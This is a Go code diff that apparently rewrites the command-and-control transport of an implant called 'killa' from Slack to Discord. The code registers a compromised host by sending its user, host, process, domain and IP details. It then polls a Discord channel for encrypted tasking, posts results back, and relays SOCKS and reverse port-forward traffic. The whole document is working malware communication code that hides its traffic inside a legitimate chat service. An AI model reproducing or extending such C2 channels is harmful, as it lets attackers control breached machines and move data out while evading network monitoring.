@@ -1,4 +1,4 @@
-package slack
+package discord
 
 import (
 	"bytes"
@@ -11,56 +11,54 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"killa/pkg/structs"
 	"sort"
 	"strings"
 	"time"
 
-	"killa/pkg/structs"
-	"github.com/slack-go/slack"
+	"github.com/bwmarrin/discordgo"
 )
 
 const (
-	inboundPrefix  = "FWK_IN:"
-	outboundPrefix = "FWK_OUT:"
+	outboundPrefix = "AgentMessage: "
+	inboundPrefix  = "C2Message: "
 )
 
-type SlackProfile struct {
-	BotToken      string
-	ChannelID     string
-	EncryptionKey string
-	Debug         bool
-	CallbackUUID  string
-	PollInterval  time.Duration
-	client        *slack.Client
-	lastTs        string
-
+type DiscordProfile struct {
+	BotToken               string
+	ChannelID              string
+	EncryptionKey          string
+	CallbackUUID           string
+	Debug                  bool
+	PollInterval           time.Duration
 	GetDelegatesOnly       func() []structs.DelegateMessage
 	GetDelegatesAndEdges   func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage)
-	HandleDelegates        func(delegates []structs.DelegateMessage)
 	GetRpfwdOutbound       func() []structs.SocksMsg
-	HandleRpfwd            func(msgs []structs.SocksMsg)
 	GetInteractiveOutbound func() []structs.InteractiveMsg
+	HandleRpfwd            func(msgs []structs.SocksMsg)
 	HandleInteractive      func(msgs []structs.InteractiveMsg)
+	HandleDelegates        func(msgs []structs.DelegateMessage)
+
+	client *discordgo.Session
+	lastTs string
 }
 
-func NewSlackProfile(botToken, channelID, encryptionKey string, pollIntervalSeconds int, debug bool) *SlackProfile {
-	if pollIntervalSeconds <= 0 {
-		pollIntervalSeconds = 5
-	}
-	return &SlackProfile{BotToken: botToken, ChannelID: channelID, EncryptionKey: encryptionKey, Debug: debug, PollInterval: time.Duration(pollIntervalSeconds) * time.Second, client: slack.New(botToken)}
+func NewDiscordProfile(botToken, channelID, encryptionKey string, pollIntervalSeconds int, debug bool) *DiscordProfile {
+	s, _ := discordgo.New("Bot " + botToken)
+	return &DiscordProfile{BotToken: botToken, ChannelID: channelID, EncryptionKey: encryptionKey, Debug: debug, PollInterval: time.Duration(pollIntervalSeconds) * time.Second, client: s}
 }
 
-func (s *SlackProfile) Checkin(agent *structs.Agent) error {
+func (s *DiscordProfile) Checkin(agent *structs.Agent) error {
 	checkinMsg := structs.CheckinMessage{Action: "checkin", PayloadUUID: agent.PayloadUUID, User: agent.User, Host: agent.Host, PID: agent.PID, OS: agent.OS, Architecture: agent.Architecture, Domain: agent.Domain, IPs: []string{agent.InternalIP}, ExternalIP: agent.ExternalIP, ProcessName: agent.ProcessName, Integrity: agent.Integrity}
 	resp, err := s.sendAndPoll(agent.PayloadUUID, checkinMsg, 20*time.Second)
 	if err != nil {
 		s.CallbackUUID = agent.PayloadUUID
-		return fmt.Errorf("slack checkin send/poll failed: %w", err)
+		return fmt.Errorf("discord checkin send/poll failed: %w", err)
 	}
 	var parsed map[string]any
 	if err := json.Unmarshal(resp, &parsed); err != nil {
 		s.CallbackUUID = agent.PayloadUUID
-		return fmt.Errorf("slack checkin decode failed: %w", err)
+		return fmt.Errorf("discord checkin decode failed: %w", err)
 	}
 	if v, ok := parsed["id"].(string); ok && v != "" {
 		s.CallbackUUID = v
@@ -72,8 +70,8 @@ func (s *SlackProfile) Checkin(agent *structs.Agent) error {
 	return nil
 }
 
-func (s *SlackProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
-	msg := structs.TaskingMessage{Action: "get_tasking", TaskingSize: -1, Socks: outboundSocks, PayloadUUID: s.getActiveUUID(agent), PayloadType: "killa", C2Profile: "slack"}
+func (s *DiscordProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
+	msg := structs.TaskingMessage{Action: "get_tasking", TaskingSize: -1, Socks: outboundSocks, PayloadUUID: s.getActiveUUID(agent), PayloadType: "killa", C2Profile: "discord"}
 	if s.GetDelegatesOnly != nil {
 		if delegates := s.GetDelegatesOnly(); len(delegates) > 0 {
 			msg.Delegates = delegates
@@ -91,11 +89,11 @@ func (s *SlackProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.
 	}
 	resp, err := s.sendAndPoll(s.getActiveUUID(agent), msg, 10*time.Second)
 	if err != nil {
-		return nil, nil, fmt.Errorf("slack get_tasking send/poll failed: %w", err)
+		return nil, nil, fmt.Errorf("discord get_tasking send/poll failed: %w", err)
 	}
 	var m map[string]any
 	if err := json.Unmarshal(resp, &m); err != nil {
-		return nil, nil, fmt.Errorf("slack get_tasking decode failed: %w", err)
+		return nil, nil, fmt.Errorf("discord get_tasking decode failed: %w", err)
 	}
 	var tasks []structs.Task
 	if taskList, ok := m["tasks"].([]any); ok {
@@ -115,7 +113,7 @@ func (s *SlackProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.
 	return tasks, inboundSocks, nil
 }
 
-func (s *SlackProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
+func (s *DiscordProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
 	msg := structs.PostResponseMessage{Action: "post_response", Responses: []structs.Response{response}, Socks: socks}
 	if s.GetRpfwdOutbound != nil {
 		if rpfwdMsgs := s.GetRpfwdOutbound(); len(rpfwdMsgs) > 0 {
@@ -147,19 +145,19 @@ func (s *SlackProfile) PostResponse(response structs.Response, agent *structs.Ag
 	return resp, nil
 }
 
-func (s *SlackProfile) GetCallbackUUID() string { return s.CallbackUUID }
+func (s *DiscordProfile) GetCallbackUUID() string { return s.CallbackUUID }
 
-func (s *SlackProfile) sendAndPoll(activeUUID string, msg any, waitFor time.Duration) ([]byte, error) {
+func (s *DiscordProfile) sendAndPoll(activeUUID string, msg any, waitFor time.Duration) ([]byte, error) {
 	body, err := json.Marshal(msg)
 	if err != nil {
-		return nil, fmt.Errorf("marshal slack message: %w", err)
+		return nil, fmt.Errorf("marshal discord message: %w", err)
 	}
 	payload, err := s.encodeEnvelope(activeUUID, body)
 	if err != nil {
 		return nil, err
 	}
-	if _, _, err := s.client.PostMessage(s.ChannelID, slack.MsgOptionText(outboundPrefix+payload, false)); err != nil {
-		return nil, fmt.Errorf("post slack message: %w", err)
+	if _, err := s.client.ChannelMessageSend(s.ChannelID, outboundPrefix+payload); err != nil {
+		return nil, fmt.Errorf("post discord message: %w", err)
 	}
 	deadline := time.Now().Add(waitFor)
 	var lastPollErr error
@@ -174,29 +172,27 @@ func (s *SlackProfile) sendAndPoll(activeUUID string, msg any, waitFor time.Dura
 		time.Sleep(s.PollInterval)
 	}
 	if lastPollErr != nil {
-		return nil, fmt.Errorf("no inbound Slack response: last poll error: %w", lastPollErr)
+		return nil, fmt.Errorf("no inbound Discord response: last poll error: %w", lastPollErr)
 	}
-	return nil, fmt.Errorf("no inbound Slack response")
+	return nil, fmt.Errorf("no inbound Discord response")
 }
 
-func (s *SlackProfile) pollInboundEnvelope() ([]byte, bool, error) {
-	params := &slack.GetConversationHistoryParameters{ChannelID: s.ChannelID, Limit: 25, Inclusive: false, Oldest: s.lastTs}
-	history, err := s.client.GetConversationHistory(params)
+func (s *DiscordProfile) pollInboundEnvelope() ([]byte, bool, error) {
+	messages, err := s.client.ChannelMessages(s.ChannelID, 25, "", s.lastTs, "")
 	if err != nil {
 		return nil, false, err
 	}
-	if len(history.Messages) == 0 {
+	if len(messages) == 0 {
 		return nil, false, nil
 	}
-	sort.Slice(history.Messages, func(i, j int) bool { return history.Messages[i].Timestamp < history.Messages[j].Timestamp })
-	for _, msg := range history.Messages {
-		if msg.Timestamp > s.lastTs {
-			s.lastTs = msg.Timestamp
-		}
-		if !strings.HasPrefix(msg.Text, inboundPrefix) {
+	sort.Slice(messages, func(i, j int) bool { return messages[i].Timestamp.Before(messages[j].Timestamp) })
+	for _, msg := range messages {
+		s.lastTs = msg.ID
+
+		if !strings.HasPrefix(msg.Content, inboundPrefix) {
 			continue
 		}
-		encoded := strings.TrimSpace(strings.TrimPrefix(msg.Text, inboundPrefix))
+		encoded := strings.TrimSpace(strings.TrimPrefix(msg.Content, inboundPrefix))
 		decoded, err := s.decodeEnvelope(encoded)
 		if err != nil {
 			continue
@@ -206,14 +202,14 @@ func (s *SlackProfile) pollInboundEnvelope() ([]byte, bool, error) {
 	return nil, false, nil
 }
 
-func (s *SlackProfile) getActiveUUID(agent *structs.Agent) string {
+func (s *DiscordProfile) getActiveUUID(agent *structs.Agent) string {
 	if s.CallbackUUID != "" {
 		return s.CallbackUUID
 	}
 	return agent.PayloadUUID
 }
 
-func (s *SlackProfile) routeInboundMessages(m map[string]any) {
+func (s *DiscordProfile) routeInboundMessages(m map[string]any) {
 	if s.HandleRpfwd != nil {
 		if rpfwdList, exists := m["rpfwd"]; exists {
 			if rpfwdRaw, err := json.Marshal(rpfwdList); err == nil {
@@ -246,7 +242,7 @@ func (s *SlackProfile) routeInboundMessages(m map[string]any) {
 	}
 }
 
-func (s *SlackProfile) encodeEnvelope(activeUUID string, data []byte) (string, error) {
+func (s *DiscordProfile) encodeEnvelope(activeUUID string, data []byte) (string, error) {
 	if s.EncryptionKey != "" {
 		var err error
 		data, err = s.encryptMessage(data)
@@ -258,21 +254,21 @@ func (s *SlackProfile) encodeEnvelope(activeUUID string, data []byte) (string, e
 	return base64.StdEncoding.EncodeToString(messageData), nil
 }
 
-func (s *SlackProfile) decodeEnvelope(encoded string) ([]byte, error) {
+func (s *DiscordProfile) decodeEnvelope(encoded string) ([]byte, error) {
 	decoded, err := base64.StdEncoding.DecodeString(encoded)
 	if err != nil {
 		return nil, err
 	}
 	if s.EncryptionKey == "" {
 		if len(decoded) <= 36 {
-			return nil, fmt.Errorf("decoded slack message too short")
+			return nil, fmt.Errorf("decoded discord message too short")
 		}
 		return decoded[36:], nil
 	}
 	return s.decryptResponse(decoded)
 }
 
-func (s *SlackProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
+func (s *DiscordProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 	key, err := base64.StdEncoding.DecodeString(s.EncryptionKey)
 	if err != nil {
 		return nil, err
@@ -313,7 +309,7 @@ func (s *SlackProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 	return decrypted[:len(decrypted)-padLen], nil
 }
 
-func (s *SlackProfile) encryptMessage(msg []byte) ([]byte, error) {
+func (s *DiscordProfile) encryptMessage(msg []byte) ([]byte, error) {
 	key, err := base64.StdEncoding.DecodeString(s.EncryptionKey)
 	if err != nil {
 		return nil, err
